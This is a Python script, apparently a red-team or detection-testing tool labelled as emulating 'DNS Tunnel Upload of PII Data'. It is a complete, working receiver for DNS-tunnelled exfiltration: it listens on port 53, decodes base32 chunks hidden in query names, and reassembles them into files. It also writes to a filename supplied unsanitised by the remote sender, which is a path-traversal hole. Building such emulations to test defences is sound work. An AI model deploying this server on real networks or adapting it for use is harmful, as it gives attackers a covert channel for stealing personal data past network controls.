import argparse
import socket
import base64
import sys
import logging

try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.org/project/dnslib/>. Please install it with `pip install dnslib`.")
    sys.exit(1)


DONE_MARKER = 'DONE!'
INIT_MARKER = base64.b32encode(b'INIT!').decode()

# defines the log format
LOG_FORMAT = "%(asctime)s.%(msecs)03d - %(levelname)s - %(message)s"
DATE_FORMAT = "%m/%d/%Y %H:%M:%S"
logging.basicConfig(filename='my.log', level=logging.INFO, format=LOG_FORMAT, datefmt=DATE_FORMAT)


def dns_query_responce_builder(request):
    logging.info("received dns requry of {domain} on type TXT".format(domain=str(request.q.qname)[:-1]))
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
    return reply


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="DNS Tunnel Upload of PII Data emulation")
    parser.add_argument("-domain", help = "the domain to listen on", required=True)
    args = parser.parse_args()

    domain = args.domain

    domain_segments = len(domain.split('.'))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0',53))

    print("Listening on {domain}".format(domain=args.domain))

    while True:
        data,addr = sock.recvfrom(1024)
        request=DNSRecord.parse(data)
        qnames = str(request.q.qname)[:-1].split('.')
        base_domain = '.'.join(i for i in qnames[-domain_segments:])
        # start to transfer file
        if qnames[0] == INIT_MARKER and base_domain == domain:
            print("start transferring file "+base64.b32decode(qnames[1]).decode())
            reply = dns_query_responce_builder(request)
            logging.info("sending dns reponse to {addr} with data: {data}".format(addr=str(addr),data=reply.pack()))
            sock.sendto(reply.pack(),addr)

            filename = base64.b32decode(qnames[1]).decode()
            with open(filename, 'wb') as f:
                # retrieve the content of the file
                while True:
                    data,addr = sock.recvfrom(1024)
                    request=DNSRecord.parse(data)
                    data=str(request.q.qname)[:-1].replace('.'+domain,"")
                    try:
                        data=list(map(base64.b32decode,data.split(".")))
                        reply = dns_query_responce_builder(request)

                        # file tranfer is done
                        if data[0].decode() == DONE_MARKER:
                            print("{filename} received!".format(filename=filename))
                            logging.info("sending dns reponse to {addr} with data: {data}".format(addr=str(addr),data=reply.pack()))
                            sock.sendto(reply.pack(),addr)
                            break
                        # used to do some ordering check, but turned out to be useless,
                        # because UDP does not guarantee packets will reach dst in order of being sent
                        f.write(data[0])
                        logging.info("sending dns reponse to {addr} with data: {data}".format(addr=str(addr),data=reply.pack()))
                        sock.sendto(reply.pack(),addr)
                    except:
                        reply = dns_query_responce_builder(request)
                        sock.sendto(reply.pack(),addr)
        else:
            print("irrelevant dns query received, ignore it")
